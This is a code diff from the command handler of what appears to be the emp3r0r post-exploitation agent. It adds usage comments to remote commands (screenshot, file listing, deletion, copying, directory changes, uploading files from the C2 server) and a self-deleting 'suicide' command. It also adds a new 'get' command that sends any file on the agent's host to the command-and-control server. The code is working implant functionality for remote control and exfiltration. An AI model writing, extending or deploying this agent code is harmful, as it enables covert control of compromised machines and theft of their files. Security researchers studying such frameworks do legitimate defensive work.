@@ -83,6 +83,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		utils
 	*/
 	case "screenshot":
+		// Usage: screenshot
+		// Takes a screenshot and sends the file path to CC.
 		if len(cmdSlice) != 1 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
@@ -105,6 +107,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		sendResponse(out)
 
 	case "suicide":
+		// Usage: suicide
+		// Deletes all agent files and exits.
 		if len(cmdSlice) != 1 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
@@ -122,6 +126,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// ls current path
 	case "ls":
+		// Usage: ls --dst <directory>
+		// Lists the contents of the specified directory.
 		target_dir := flags.StringP("dst", "d", ".", "Directory to list")
 		flags.Parse(cmdSlice[1:])
 		if flags.NArg() > 0 {
@@ -136,6 +142,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// remove file/dir
 	case "rm":
+		// Usage: rm --dst <path>
+		// Removes the specified file or directory.
 		path := flags.StringP("dst", "d", "", "Path to remove")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
@@ -150,6 +158,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// mkdir
 	case "mkdir":
+		// Usage: mkdir --dst <path>
+		// Creates a directory at the specified path.
 		path := flags.StringP("dst", "d", "", "Path to create")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
@@ -164,6 +174,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// copy file/dir
 	case "cp":
+		// Usage: cp --src <source> --dst <destination>
+		// Copies a file or directory from source to destination.
 		src := flags.StringP("src", "s", "", "Source path")
 		dst := flags.StringP("dst", "d", "", "Destination path")
 		flags.Parse(cmdSlice[1:])
@@ -179,6 +191,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// move file/dir
 	case "mv":
+		// Usage: mv --src <source> --dst <destination>
+		// Moves a file or directory from source to destination.
 		src := flags.StringP("src", "s", "", "Source path")
 		dst := flags.StringP("dst", "d", "", "Destination path")
 		flags.Parse(cmdSlice[1:])
@@ -194,6 +208,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// change directory
 	case "cd":
+		// Usage: cd --dst <path>
+		// Changes the current working directory to the specified path.
 		path := flags.StringP("dst", "d", "", "Path to change to")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
@@ -209,6 +225,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// current working directory
 	case "pwd":
+		// Usage: pwd
+		// Prints the current working directory.
 		if flags.NArg() != 0 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
@@ -225,6 +243,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// put file on agent
 	case "put":
+		// Usage: put --file <file> --path <destination> --size <size>
+		// Downloads a file from CC to the specified path on the agent.
 		file_to_download := flags.StringP("file", "f", "", "File to download")
 		path := flags.StringP("path", "p", "", "Destination path")
 		size := flags.Int64P("size", "s", 0, "Size of the file")
@@ -248,6 +268,27 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
 		}
 
+		sendResponse(out)
+
+		// get file from agent
+	case "get":
+		// Usage: get --filepath <filepath> --offset <offset> --token <token>
+		// Downloads a file from the agent starting at the specified offset.
+		filepath := flags.StringP("filepath", "f", "", "File path to download")
+		offset := flags.Int64P("offset", "o", 0, "Offset to start downloading from")
+		token := flags.StringP("token", "t", "", "Token for the download")
+		flags.Parse(cmdSlice[1:])
+		if *filepath == "" || *offset < 0 || *token == "" {
+			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
+			return
+		}
+		log.Printf("File download: %s at %d with token %s", *filepath, *offset, *token)
+		err = sendFile2CC(*filepath, *offset, *token)
+		out = fmt.Sprintf("%s has been sent, please check", *filepath)
+		if err != nil {
+			log.Printf("get: %v", err)
+			out = *filepath + err.Error()
+		}
 		sendResponse(out)
 
 	default:
